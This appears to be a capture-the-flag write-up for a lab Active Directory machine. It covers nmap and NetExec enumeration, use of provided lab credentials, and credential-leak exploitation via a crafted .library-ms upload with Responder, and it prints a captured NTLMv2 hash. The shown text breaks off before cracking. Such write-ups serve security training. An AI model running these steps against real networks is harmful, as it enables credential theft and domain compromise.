@@ -1,0 +1,642 @@
+|-----------------------------------------------------------------------|
+| TARGET MACHINE NAME:	       FLUFFY					                          |
+| TARGET MACHINE IP:		       10.10.11.69				                      |
+| TARGET MACHINE ENVIRONMENT:	 WINDOWS / ACTIVE DIRECTORY		            |
+| ATTACK AUTHOR:		           EAGLE-1					                        |
+|-----------------------------------------------------------------------|
+SYNOPSIS: The target machine identified as "FLUFFY" is a windows environment that exposes open ports 
+that are consistent with the presence of Active Directory services. The overall result of compromising
+the target domain extends from the exploitation of Active Directory Certificate Services and their
+potential misconfigurations. In short, Active Directory Certificate Services (AD CS) are tools 
+utilized within Active Directory to facilitate secure communication and authentication protocols. 
+
+AD CS is often used to enhance security by binding the identity of a person, computer, or service to a 
+corresponding private key - with components like Certificate Authorities and Public Key Infrastructure
+(PKI) implementations being used to assist in the issuing, managing, revocation and renewal of 
+certificates in order to verify user and device identities for the purpose of secure network communication.
+
+In this instance, we will use parts this functionality to - in essence: abuse the misconfiguration of 
+an initially low-privileged user to manipulate and assume the permissions of an object within the domain
+that allows us to communicate with the certificate services, bind new credentials (shadow credentials) to 
+the low-privileged user and use said credentials to mimic the administrator's permissions on the domain,
+resulting in a full compromise.
+
+This will be a technically exhaustive writeup on the attack methodolgy used in the preliminary enumeration 
+phases, initial compromise, deeper Active Directory enumeration, privilege escalation and the final compromise 
+of the target domain. As per the description of the machine - we will also be provided entry credentials of a
+low-privileged user that we will utilize in the early stages of our target enumeration.
+
+USERNAME: j.fleischman
+PASSWORD: J0elTHEM4n1990!
+
+-----------------------------------------
+| PHASE ONE:	NMAP ENUMERATION	        |  
+-----------------------------------------
+Using Nmap, a commonly used open source tool that identifies devices, services and scripts operating on a
+network - we will perform a few scans to obtain as much information as possible using scans ranging from
+simple and low-profile to verbose and intensive. We can start our Nmap scans by attempting to identify
+all hosts that are alive on a target network. For the sake of the exercise - even though we know that our 
+primary entry point will be at the 10.10.11.69 address, it will help to be as thorough as possible and
+understand all factors that may implicate or assist our enumeration and subsequent attack of the target
+environment in regards to all hosts and services that are running.
+
+COMMAND: # nmap 10.10.11.69/24 -sS
+MEANING: # [TOOL][IP ADDRESS / SUBNET MASK]["STEALTH" SCAN]
+
+This is a basic scan that enumerates through all addresses within the specified subnet that are active
+and responding to the TCP probing packets that we send. We aren't scanning for specific services just yet,
+so our information is limited. However, we are now aware of all hosts that are alive and what ports they
+are exposing on the network.
+
+-----------------
+| NMAP RESULT	  |
+--------------------------------------------------------|
+Nmap scan report for 10.10.11.20			                  |					
+Host is up (0.050s latency).				                    |
+Not shown: 998 closed tcp ports (reset)			            |	
+PORT   STATE SERVICE					                          |
+22/tcp open  ssh					                              |
+80/tcp open  http					                              |
+--------------------------------------------------------|
+Nmap scan report for 10.10.11.46			                  |		
+Host is up (0.051s latency).				                    |
+Not shown: 998 closed tcp ports (reset)			            |
+PORT   STATE SERVICE					                          |
+22/tcp open  ssh					                              |
+80/tcp open  http					                              |
+--------------------------------------------------------|
+Nmap scan report for 10.10.11.64			                  |
+Host is up (0.051s latency).				                    |
+Not shown: 998 closed tcp ports (reset)			            |
+PORT   STATE SERVICE					                          |
+22/tcp open  ssh					                              |
+80/tcp open  http					                              |
+--------------------------------------------------------|
+Nmap scan report for fluffy.htb (10.10.11.69)		        |
+Host is up (0.052s latency).				                    |
+Not shown: 989 filtered tcp ports (no-response)		      |
+PORT     STATE SERVICE					                        |
+53/tcp   open  domain					                          |
+88/tcp   open  kerberos-sec				                      |
+139/tcp  open  netbios-ssn				                      |
+389/tcp  open  ldap					                            |
+445/tcp  open  microsoft-ds				                      |
+464/tcp  open  kpasswd5					                        |
+593/tcp  open  http-rpc-epmap				                    |
+636/tcp  open  ldapssl					                        |
+3268/tcp open  globalcatLDAP				                    |
+3269/tcp open  globalcatLDAPssl				                  |
+5985/tcp open  wsman					                          |
+--------------------------------------------------------|
+Nmap scan report for 10.10.11.72			                  |
+Host is up (0.052s latency).				                    |
+Not shown: 987 filtered tcp ports (no-response)		      |
+PORT     STATE SERVICE					                        |
+53/tcp   open  domain					                          |
+80/tcp   open  http					                            |
+88/tcp   open  kerberos-sec				                      |
+135/tcp  open  msrpc					                          |
+139/tcp  open  netbios-ssn				                      |
+389/tcp  open  ldap					                            |
+445/tcp  open  microsoft-ds				                      |
+464/tcp  open  kpasswd5					                        |
+593/tcp  open  http-rpc-epmap				                    |
+636/tcp  open  ldapssl					                        |
+3268/tcp open  globalcatLDAP				                    |
+3269/tcp open  globalcatLDAPssl				                  |
+5985/tcp open  wsman					                          |
+--------------------------------------------------------|
+Nmap scan report for 10.10.11.154			                  |
+Host is up (0.050s latency).				                    |
+Not shown: 998 closed tcp ports (reset)			            |
+PORT   STATE SERVICE					                          |
+22/tcp open  ssh					                              |
+80/tcp open  http					                              |
+--------------------------------------------------------|
+Nmap scan report for 10.10.11.189			                  |
+Host is up (0.050s latency).				                    |
+Not shown: 998 closed tcp ports (reset)			            |
+PORT   STATE SERVICE					                          |
+22/tcp open  ssh					                              |
+80/tcp open  http					                              |
+--------------------------------------------------------|
+Nmap scan report for 10.10.11.194			                  |
+Host is up (0.050s latency).				                    |
+Not shown: 997 closed tcp ports (reset)			            |
+PORT     STATE SERVICE					                        |
+22/tcp   open  ssh					                            |
+80/tcp   open  http					                            |
+9091/tcp open  xmltec-xmlmail				                    |
+--------------------------------------------------------|
+Based on the results provided - especially at addresses: 10.10.11.69 and 10.10.11.72, we can make positive
+assertations that the target is a windows active directory environment. We know this due to the following open
+ports:
+
+[53:DNS]
+[88:KERBEROS]
+[389:LDAP]
+[445:MICROSOFT-DS/SMB]
+[464:KPASSWD5]
+[3268/3269:LDAP/LDAPSSL]
+
+These ports are typical in the presence of Active Directory environments and points to the services that we will
+soon enumerate in order to gain an initial foothold. Before we go further, we will conduct another scan that will
+be more intensive and show us additional information pertaining to the domain that we will need to make our further
+enumeration successful.
+
+COMMAND: # nmap 10.10.11.69 -sCV -A -O -p- --min-rate=10000 --stats-every=10s -oX FLUFFY-NMAP.xml
+MEANING: # [TOOL][IP ADDRESS][SERVICE/SCRIPT SCAN][AGGRESSIVE SCAN][OS SCAN][PORTS 0-65535][PACKETS PER SECOND][VERBOSE SCAN STATS][XML FILE OUTPUT]
+
+|---------------|
+| NMAP RESULT	  |
+|---------------|---------------------------------------------------------------------------------------------------------------
+Nmap scan report for fluffy.htb (10.10.11.69)											
+Host is up (0.052s latency).													
+Not shown: 65516 filtered tcp ports (no-response)										
+PORT      STATE SERVICE       VERSION												
+53/tcp    open  domain        Simple DNS Plus											
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-17 09:11:24Z)					
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn									
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)	
+|_ssl-date: 2025-06-17T09:13:07+00:00; +14m49s from scanner time.								
+| ssl-cert: Subject: commonName=DC01.fluffy.htb											
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb					
+| Not valid before: 2025-04-17T16:04:17												
+|_Not valid after:  2026-04-17T16:04:17												
+445/tcp   open  microsoft-ds?													
+464/tcp   open  kpasswd5?													
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0								
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)	
+| ssl-cert: Subject: commonName=DC01.fluffy.htb											
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb					
+| Not valid before: 2025-04-17T16:04:17												
+|_Not valid after:  2026-04-17T16:04:17												
+|_ssl-date: 2025-06-17T09:13:07+00:00; +14m49s from scanner time.								
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)	
+|_ssl-date: 2025-06-17T09:13:07+00:00; +14m49s from scanner time.								
+| ssl-cert: Subject: commonName=DC01.fluffy.htb											
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb					
+| Not valid before: 2025-04-17T16:04:17												
+|_Not valid after:  2026-04-17T16:04:17												
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)	
+|_ssl-date: 2025-06-17T09:13:07+00:00; +14m49s from scanner time.								
+| ssl-cert: Subject: commonName=DC01.fluffy.htb											
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb					
+| Not valid before: 2025-04-17T16:04:17												
+|_Not valid after:  2026-04-17T16:04:17												
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)								
+|_http-server-header: Microsoft-HTTPAPI/2.0											
+|_http-title: Not Found														
+9389/tcp  open  mc-nmf        .NET Message Framing										
+49667/tcp open  msrpc         Microsoft Windows RPC										
+49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0								
+49686/tcp open  msrpc         Microsoft Windows RPC										
+49695/tcp open  msrpc         Microsoft Windows RPC										
+49700/tcp open  msrpc         Microsoft Windows RPC									
+49710/tcp open  msrpc         Microsoft Windows RPC										
+49729/tcp open  msrpc         Microsoft Windows RPC										
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port				
+Device type: general purpose													
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)									
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10							
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)					
+No exact OS matches for host (test conditions non-ideal).									
+Network Distance: 2 hops													
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows								
+																
+Host script results:														
+| smb2-security-mode:														
+|   3:1:1:															
+|_    Message signing enabled and required											
+|_clock-skew: mean: 14m48s, deviation: 1s, median: 14m48s									
+| smb2-time:															
+|   date: 2025-06-17T09:12:28													
+|_  start_date: N/A														
+																
+TRACEROUTE (using port 139/tcp)													
+HOP RTT      ADDRESS														
+1   53.82 ms 10.10.14.1														
+2   54.12 ms fluffy.htb (10.10.11.69)												
+---------------------------------------------------------------------------------------------------------------------------------
+
+From this scan, particularly against the 10.10.11.69 address, we get comprehensive information on the open ports, scripts, and services
+operating on the network. In addition to further confirming the presence of Active Directory components, we also begin to identify domain
+name and the address of the domain controller itself.
+
+---------------------------------------------------------
+|	DOMAIN NAME:		FLUFFY.HTB/FLUFFY.HTB0	              |
+|	DOMAIN CONTROLLER:	DC01.FLUFFY.HTB		                |
+---------------------------------------------------------
+PERSONAL NOTE: Due to the way that differing tools resolve the common names of domains and their associated controllers - on top of
+just generally being unsure if there is a typo/idiosyncrasy in the results of the Nmap scan, we will append the address FLUFFY.HTB,
+FLUFFY.HTB0 as well as DC01.FLUFFY.HTB to our /etc/hosts file so we can properly resolve these components with the 10.10.11.69 IP address.
+
+At this point, we have obtained more than enough information to continue on with our target enumeration. With this information on-hand, we
+will begin to enumerate the specific services that can potentially give us our initial foothold.
+
+-------------------------------------------------
+| PHASE TWO:	SMB ENUMERATION /W NETEXEC	      |
+-------------------------------------------------
+To begin our deeper enumeration of the target environment, we will begin targeting port 445 - also known as Microsoft-DS or Server Message
+Block (SMB). We will use a tool known as NetExec to enumerate not just SMB, but the many services that are present within the target domain.
+NetExec is a network service exploitation tool. It can be used in the reconaissance of small and large networks and assists in the functions 
+that we will need to identify accounts, test authentication of hashes, search for domain users and groups, as well as directly exploit certain 
+vulnerabilities that may be present in an Active Directory environment.
+
+In order for NetExec to be successful in enumerating basic SMB services, we first need valid credentials that will allow us to authenticate 
+against the domain. As mentioned before - we are simulating an internal penetration test using pre-provided credentials. In a real-world test,
+we may not have these credentials and would potentially have to enumerate from a black box perspective. However, in this scenario, we can begin
+to utilize the username and password provided above to enumerate the SMB service. A few things in particular that we will want to know are:
+
+[DOMAIN USERS]
+[DOMAIN GROUPS]
+[DOMAIN USER PASSWORD POLICIES]
+[DOMAIN NETWORK SHARES]
+
+Let us begin with enumerating the users present within the target domain.
+
+COMMAND: # nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
+MEANING: # [TOOL][SMB PROTOCOL][IP ADDRESS][-U USERNAME][-P USER PASSWORD][ENUMERATION MODULE]
+
+----------------------------------------
+| NETEXEC SMB USERS ENUMERATION RESULT |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)		            |
+SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!										                                                      |
+SMB         10.10.11.69     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-						                                  | 
+SMB         10.10.11.69     445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain	  |
+SMB         10.10.11.69     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain	|
+SMB         10.10.11.69     445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account			              |			
+SMB         10.10.11.69     445    DC01             ca_svc                        2025-04-17 16:07:50 0									                                                |
+SMB         10.10.11.69     445    DC01             ldap_svc                      2025-04-17 16:17:00 0									                                                |
+SMB         10.10.11.69     445    DC01             p.agila                       2025-04-18 14:37:08 0									                                                |
+SMB         10.10.11.69     445    DC01             winrm_svc                     2025-05-18 00:51:16 0									                                                |
+SMB         10.10.11.69     445    DC01             j.coffey                      2025-04-19 12:09:55 0									                                                |
+SMB         10.10.11.69     445    DC01             j.fleischman                  2025-05-16 14:46:55 0									                                                |
+SMB         10.10.11.69     445    DC01             [*] Enumerated 9 local users: FLUFFY										                                                            |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+
+In the result above, our first scan initially shows that our credentials are valid in their authentication
+against the domain and provides us with results pertaining to all users and accounts present on the domain.
+As we can see, the scan yields nine (9) results. Considering that we may want to use these usernames in
+subsequent password spraying and other forms of enumeration, we should go ahead and add these usernames to
+a wordlist that can be used for later processing. 
+
+Next, it will be helpful to enumerate the groups present on the domain that users can potentially be apart
+of. 
+
+COMMAND: # nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --local-groups
+MEANING: # [TOOL][SMB PROTOCOL][IP ADDRESS][-U USERNAME][-P USER PASSWORD][ENUMERATION MODULE]
+
+-----------------------------------------
+| NETEXEC SMB GROUPS ENUMERATION RESULT |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)	
+SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!									
+SMB         10.10.11.69     445    DC01             [*] Enumerating with SAMRPC protocol									|
+SMB         10.10.11.69     445    DC01             [+] Enumerated local groups											
+SMB         10.10.11.69     445    DC01             549 - Server Operators											
+SMB         10.10.11.69     445    DC01             548 - Account Operators											
+SMB         10.10.11.69     445    DC01             554 - Pre-Windows 2000 Compatible Access									
+SMB         10.10.11.69     445    DC01             557 - Incoming Forest Trust Builders									
+SMB         10.10.11.69     445    DC01             560 - Windows Authorization Access Group									
+SMB         10.10.11.69     445    DC01             561 - Terminal Server License Servers									
+SMB         10.10.11.69     445    DC01             544 - Administrators											
+SMB         10.10.11.69     445    DC01             545 - Users													
+SMB         10.10.11.69     445    DC01             546 - Guests											
+SMB         10.10.11.69     445    DC01             550 - Print Operators											
+SMB         10.10.11.69     445    DC01             551 - Backup Operators											
+SMB         10.10.11.69     445    DC01             552 - Replicator												
+SMB         10.10.11.69     445    DC01             555 - Remote Desktop Users											
+SMB         10.10.11.69     445    DC01             556 - Network Configuration Operators									
+SMB         10.10.11.69     445    DC01             558 - Performance Monitor Users										
+SMB         10.10.11.69     445    DC01             559 - Performance Log Users											
+SMB         10.10.11.69     445    DC01             562 - Distributed COM Users											
+SMB         10.10.11.69     445    DC01             568 - IIS_IUSRS												
+SMB         10.10.11.69     445    DC01             569 - Cryptographic Operators										
+SMB         10.10.11.69     445    DC01             573 - Event Log Readers											
+SMB         10.10.11.69     445    DC01             574 - Certificate Service DCOM Access									
+SMB         10.10.11.69     445    DC01             575 - RDS Remote Access Servers										
+SMB         10.10.11.69     445    DC01             576 - RDS Endpoint Servers											
+SMB         10.10.11.69     445    DC01             577 - RDS Management Servers										
+SMB         10.10.11.69     445    DC01             578 - Hyper-V Administrators										
+SMB         10.10.11.69     445    DC01             579 - Access Control Assistance Operators									
+SMB         10.10.11.69     445    DC01             580 - Remote Management Users										
+SMB         10.10.11.69     445    DC01             582 - Storage Replica Administrators									
+SMB         10.10.11.69     445    DC01             517 - Cert Publishers											
+SMB         10.10.11.69     445    DC01             553 - RAS and IAS Servers											
+SMB         10.10.11.69     445    DC01             571 - Allowed RODC Password Replication Group								
+SMB         10.10.11.69     445    DC01             572 - Denied RODC Password Replication Group								
+SMB         10.10.11.69     445    DC01             1101 - DnsAdmins												
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+The following result shows us all user groups present on the domain. While this doesn't exactly show us
+specific permissions that can be leveraged, it does give us an idea on the capabilities of a domain user
+assuming they are identified to be apart of a specific user group. It will be likely that during our later
+enumeration phases that we will identify specific permissions based on assigned user group that we will be 
+able to leverage. 
+
+For now, we will do another scan relating to the domain user password policy.
+
+COMMAND: # nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --pass-pol
+MEANING: # [TOOL][PROTOCOL][IP ADDRESS][-U USERNAME][-P USER PASSWORD][ENUMERATION MODULE]
+
+--------------------------------------------------
+| NETEXEC SMB PASSWORD POLICY ENUMERATION RESULT |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)	
+SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!									
+SMB         10.10.11.69     445    DC01             [+] Dumping password info for domain: FLUFFY								
+SMB         10.10.11.69     445    DC01             Minimum password length: 7											
+SMB         10.10.11.69     445    DC01             Password history length: 24											
+SMB         10.10.11.69     445    DC01             Maximum password age: 41 days 23 hours 53 minutes								
+SMB         10.10.11.69     445    DC01																
+SMB         10.10.11.69     445    DC01             Password Complexity Flags: 000000										
+SMB         10.10.11.69     445    DC01                 Domain Refuse Password Change: 0									
+SMB         10.10.11.69     445    DC01                 Domain Password Store Cleartext: 0									
+SMB         10.10.11.69     445    DC01                 Domain Password Lockout Admins: 0									
+SMB         10.10.11.69     445    DC01                 Domain Password No Clear Change: 0									
+SMB         10.10.11.69     445    DC01                 Domain Password No Anon Change: 0									
+SMB         10.10.11.69     445    DC01                 Domain Password Complex: 0										
+SMB         10.10.11.69     445    DC01																
+SMB         10.10.11.69     445    DC01             Minimum password age: 1 day 4 minutes									
+SMB         10.10.11.69     445    DC01             Reset Account Lockout Counter: 10 minutes									
+SMB         10.10.11.69     445    DC01             Locked Account Duration: 10 minutes										
+SMB         10.10.11.69     445    DC01             Account Lockout Threshold: None										
+SMB         10.10.11.69     445    DC01             Forced Log off Time: Not Set										
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+The following result gives us some helpful information pertaining to some additional methods of enumeration
+we can utilize if need be. One thing that stands out to us is the Minimum Password Length and the Account Lockout
+Threshold. The information pertaining to the Minimum Password Length can assist us in the formulation of 
+wordlists for the sake of password spraying. In addition - the Account Lockout Threshold being 'None' will
+give us more leeway in password spraying without having to worry about locking out accounts which could implicate
+the enumeration process. While password spraying is an attack method that we may want to use minimally, these
+policies make it an option should we have no other vector of attack for compromising other accounts in the future.
+
+Finally, we will want to identify the shares present on the Server Message Block. The network shares, depending on
+what is present - along with the permissions we have with our current credentials could allow us to pull additional
+information to use in order to identify additional attack vectors.
+
+COMMAND: # nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
+MEANING: # [TOOL][PROTOCOL][IP ADDRESS][-U USERNAME][-P USER PASSWORD][ENUMERATION MODULE]
+
+----------------------------------------
+| NETEXEC SMB SHARE ENUMERATION RESULT |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)	
+SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!									
+SMB         10.10.11.69     445    DC01             [*] Enumerated shares											
+SMB         10.10.11.69     445    DC01             Share           Permissions     Remark									
+SMB         10.10.11.69     445    DC01             -----           -----------     ------									
+SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin								
+SMB         10.10.11.69     445    DC01             C$                              Default share								
+SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC									
+SMB         10.10.11.69     445    DC01             IT              READ,WRITE											
+SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share								
+SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share								
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+The results returned by the SMB Share Enumeration give us a couple of results, one of which stands out to us: The
+'IT' Share. This is a non-default SMB Share and we also notice that with our current credentials, we have Read and
+Write access to this share. This means that we can both pull contents stored within these shares onto our local attack
+machine and potentially upload payloads to use in the process of privilege escalation.
+
+Having this comprehensive information pertaining to the SMB Service running on the domain, we can continue our enumeration
+of the Server Message Block - more specifically, the 'IT' Share. We can also enumerate the LDAP protocol for additional pieces
+of information, however, we will not find anything we haven't already with SMB. From here, we dive deeper into the resources
+we have access to with SMB.
+
+In order to enumerate the SMB Shares that we know we have Read and Write permissions to, we can utilize a tool known as SMBClient.
+This is a tool that allows linux clients to interact with SMB services similar to the usage of the File Transfer Protocol (FTP). In
+normal use cases, it allows a user with within a network to access shared drives in which common uses are to browse directories, upload
+and download files, performing backups, and other typical file operations utilized in a corporate, enterprise or other commercial
+environments.
+
+In terms of Penetration Testing and Red Teaming, SMBClient can be a powerful tool for enumerating the target environment and
+potentially obtaining information that can expose attack vectors. In this case, we will use SMBClient to explore and enumerate
+the 'IT' Share - where we can both read and write information to with our initial credentials.
+
+COMMAND: # smbclient \\\\10.10.11.69\\IT -U 'j.fleischman'
+MEANING: # [TOOL][\\\\IP ADDRESS\\TARGET SHARE][-U USERNAME]
+
+After making this request, the SMB Service will respond by prompting for a password, which we have. We will enter it and proceed
+to obtain access for [WORKGROUP\j.fleischman]. For those who may be unfamilair with SMBClient or SMB in general, it doesn't hurt to
+use the 'help' command in order to see the functions that may be available to a user. In this case, it's not uncommon to be limited 
+to a select few commands due to the permissions we have - however, the only functions we need right now are 'dir' - which lists the
+contents of the share we are in, 'get' - which downloads files from the SMB Service to our attacker machine, and 'put' - which does
+the opposite: uploads files to the SMB Service from our attacker machine. 
+
+When we input 'dir' command we get the following result:
+--------------------------------------------------------------------------------
+smb: \> dir									
+  .                                   D        0  Tue Jun 17 08:43:42 2025	
+  ..                                  D        0  Tue Jun 17 08:43:42 2025	
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025	
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025	
+  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025	
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025	
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025	
+										
+                5842943 blocks of size 4096. 2064063 blocks available		
+--------------------------------------------------------------------------------
+If we remember, we only have read and write permissions on this share. If we try to maneuver into other directories, it will fail.
+However, there are interesting files in the share we have access to. With that said - utilizing the 'get' command and specifying the
+files we want, we can pull them from the SMB Service and download them to our attacking machine for further enumeration. As such, 
+we will execute the following commands:
+
+COMMAND # get Everything-1.4.1.1026.x64.zip
+COMMAND # get KeePass-2.58.zip
+COMMAND # get Upgrade_Notice.pdf
+
+With the specified files now on our attacking machine, this will allow us to do a few things:
+
+1. Unzip Everyting-1.4.1.1026 for additional analysis.
+2. Unzip KeePass-2.58.zip for additional analysis.
+3. Open Upgrade_Notice.pdf into a web browser or PDF viewer for additional analysis.
+
+Upon further examination of Everything-1.4.1.1026, we discover that it is a windows tool for file indexing and searching. Going through the files
+of this tool does not yield us anything useful at this time. The same will be true for KeePass2.58 - a password management database that
+seems promising at first, but no contents within its unzipped form serves any use for us. At this point, we are still left with little
+information to leverage until we take a look at Upgrade_Notice.pdf
+
+Upgrade_Notice.pdf is an alert for members of the IT Infrastructure Department that identifies "multiple high-impact vulnerabilities" that have
+been publically disclosed and need to be remediated at a scheduled maintainence timeslot. For this scenario we can infer that these high-impact
+vulnerabilities have NOT been patched yet and we can take the opportunity to leverage the Common Vulnerabilities and Exploitations (CVEs) before
+they are patched by the IT Infrastructure Department. As per the Upgrade_Notice.pdf, six CVE's are listed for patching:
+
+[CVE-2025-24996 - CRITICAL]
+External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.
+
+[CVE-2025-24071 - CRITICAL]
+Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network.
+
+[CVE-2025-46785 - HIGH]
+Buffer over-read in some Zoom Workplace Apps for Windows may allow an authenticated user to conduct a denial of service via network access.
+
+[CVE-2025-29968 - HIGH]
+Improper input validation in Active Directory Certificate Services (AD CS) allows an authorized attacker to deny service over a network.
+
+[CVE-2025-21193 - MEDIUM]
+Active Directory Federation Server Spoofing Vulnerability.
+
+[CVE-2025-3445 - LOW]
+A Path Traversal "Zip Slip" vulnerability identified in mholt/archiver in Go. 
+
+At this point, we want to take some time to research the CVEs that have been listed to try and discover what vulnerabilities 
+can be best leveraged in the current state of the target environment. Considering the fact that the current CVEs are attacks that
+are already being exploited in the wild, the liklihood of there being information and/or potential Proof-of-Concept (POC) scripts
+being hosted somewhere is pretty high.
+
+Starting from the lowest criticality research shows that the effectiveness of this vector is debatable and low-impact. Not to mention,
+there is no sign of the mholt/archiver in the environment. Our Medium criticality CVE also does not provide much information on how this
+can be leveraged on our target and the conditions needed to make this vector work are likely not in place.
+
+For both of our High criticality CVEs, both of the revolve around Denial-of-Service attacks. Our goal is to compromise the network - not
+disrupt or shut it down. Even though CVE-2025-29968 revolves around the exploitation of Active Directory Certificate Services, which is
+a focus for us - we once again do not want to deny, disrupt or shut down our target environment.
+
+Our Critical CVE's 24996 and 24071 seem to be the most promising after continued research - more specifically: 24071. This CVE in its
+simplest definition consists of an NTLM Credential Leak via malicious Windows File Explorer interactions with network resources. In short,
+New Technology Lan Manager (NTLM) is a security protocol used in Windows environments for authentication. Upon further research, it is said
+that this CVE could allow attackers to capture NTLM credentials/hashes via crafted network resources - in this case: .library-ms files. 
+
+------------------------------
+| PHASE THREE:	EXPLOITATION |
+------------------------------
+Before we continue, we need to fully understand what our capabilities are within the network share we have access to on the domain. Before trying
+anything, we attempt to upload various Executables, Powershell Scripts, Reverse Shell One-Liners/Scripts, etc. None of these work. However, moving
+back to the general premise of the .library-ms files being the point of concern, we utilize a Proof-of-Concept script that will in short: generate
+a specially crafted .library-ms file containing an SMB path that Windows Explorer will automatically parse on upon extraction, triggering an implicit
+NTLM authentication handshake. Windows Explorer by default implicitly trusts .library-ms files and processes them immediately when they are extracted
+from archives and the interactions between the victim and the SMB server can be intercepted and ingested to an attacking machine. For this, we will use
+a tool known as Responder.
+
+After generating the .library-ms file using a PoC Script from GitHub User: 0x6rss - we will take the .zip containing the .library-ms file and use the
+'put' command to upload it to the IT share.
+
+COMMAND: # put YOUR-EXPLOIT-FILE-NAME.zip
+
+At the same time, we also want to run Responder - which is a tool used to impersonate legitimate network services and trick devices into sending
+sensitive information. In this case once our malicious file is extracted, the network responses generated by the extraction of the malicious file
+will allow us to intercept and capture the NTLM authentication request/handshake, giving us the NTLM credentials/hashes that are associated with
+those requests.
+
+COMMAND: # responder -I tun0 -wvF
+MEANING: # [TOOL][LISTENING INTERFACE][WPAD PROXY/VERBOSE OUTPUT/FORCE BASIC NTLM AUTHENTICATION]
+
+Once we have both the malicious file uploaded and responder running, it will take approximately 1-2 minutes for the target to extract and generate
+a response to the SMB server when it once again - attempts to make an NTLM authentication request upon its extraction. Assuming everything is properly
+set in place, responder should provide us with the hash of the user: p.agila that would have likely tried to extract the file in the real world under 
+the assumption that it contained a legitimate .library-ms file. For additional understanding, we could consider this a method of Social Engineering.
+
+---------------
+| NTLMv2 HASH |
+--------------------------------------------------------------------------------------------------------------------------------|
+p.agila::FLUFFY:59d841fc40d43fee:BF41C127EA316C57FE7B1EE90013F831:010100000000000080EC475799DCDB01140A8CCA245B4BA4000000000	    |
+2000800340045005000470001001E00570049004E002D0046004F0031005800330052005800430055004900460004003400570049004E002D0046004F00	    |
+3100580033005200580043005500490046002E0034004500500047002E004C004F00430041004C000300140034004500500047002E004C004F004300410	    |
+04C000500140034004500500047002E004C004F00430041004C000700080080EC475799DCDB010600040002000000080030003000000000000000010000	    |
+000020000044E048DFCADF50A76735BFCE6AC7935E0E7F5C012D91841B83C631B6DC31A3C30A00100000000000000000000000000000000000090020006	    |
+3006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000							                                    |
+--------------------------------------------------------------------------------------------------------------------------------|
+
+Now that we have this hash, we can crack it offline utilizing tools like hashcat, hydra, john the ripper, etc. For this example, we will use
